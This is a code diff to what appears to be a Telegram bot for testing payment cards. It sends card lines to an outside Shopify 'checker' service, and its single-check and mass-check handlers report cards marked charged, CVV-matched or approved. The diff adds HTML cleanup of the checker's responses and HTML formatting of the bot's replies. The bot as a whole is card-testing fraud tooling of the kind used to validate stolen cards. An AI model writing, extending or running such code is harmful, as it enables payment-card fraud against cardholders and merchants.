@@ -17,6 +17,16 @@ AUTHORIZED_USERS = {}
 
 # ---------------- Helper Functions ---------------- #
 
+def clean_response(text):
+    """Remove HTML tags and extra whitespace from response"""
+    # Remove <pre> tags
+    text = re.sub(r'<pre[^>]*>|</pre>', '', text, flags=re.IGNORECASE)
+    # Remove other HTML tags if present
+    text = re.sub(r'<[^>]+>', '', text)
+    # Clean up extra whitespace and newlines
+    text = re.sub(r'\s+', ' ', text).strip()
+    return text
+
 def load_admins():
     try:
         with open("admins.json", "r") as f:
@@ -88,7 +98,7 @@ def check_card_gateway(cc_line):
         url = f"https://chk-for-shopify.onrender.com?lista={cc_line}"
         headers = {"User-Agent": generate_user_agent()}
         r = requests.get(url, headers=headers, timeout=20)
-        return r.text.strip()
+        return clean_response(r.text.strip())
     except Exception as e:
         return f"❌ Error checking {cc_line}: {e}"
 
@@ -117,7 +127,7 @@ def chk_handler(msg):
 
     def run_check():
         result = check_card_gateway(cc)
-        bot.edit_message_text(result, msg.chat.id, processing.message_id)
+        bot.edit_message_text(result, msg.chat.id, processing.message_id, parse_mode='HTML')
 
     threading.Thread(target=run_check).start()
 
@@ -159,7 +169,7 @@ def mchk_handler(msg):
             result = check_card_gateway(cc)
             if "CHARGED" in result or "CVV MATCH" in result or "APPROVED" in result:
                 approved += 1
-                bot.send_message(msg.chat.id, result)
+                bot.send_message(msg.chat.id, result, parse_mode='HTML')
             else:
                 declined += 1
 
@@ -191,5 +201,3 @@ def keep_alive():
 
 keep_alive()
 bot.infinity_polling()
-
-
